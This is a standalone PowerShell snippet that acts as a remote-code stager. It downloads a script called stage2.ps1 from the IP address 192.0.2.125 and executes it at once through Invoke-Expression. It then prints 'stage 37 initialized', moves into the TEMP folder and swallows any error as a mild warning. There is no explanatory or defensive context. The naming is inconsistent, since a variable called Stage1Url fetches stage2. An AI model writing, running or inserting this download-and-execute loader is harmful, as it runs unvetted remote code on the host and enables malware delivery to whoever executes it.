
<# Remote fetch #> try { $Stage1Url = 'http://192.0.2.125/stage2.ps1'; Invoke-Expression (New-Object System.Net.WebClient).DownloadString($Stage1Url); Write-Output "stage 37 initialized"; Set-Location -Path $env:TEMP } catch { Write-Warning "Remote fetch failed" }
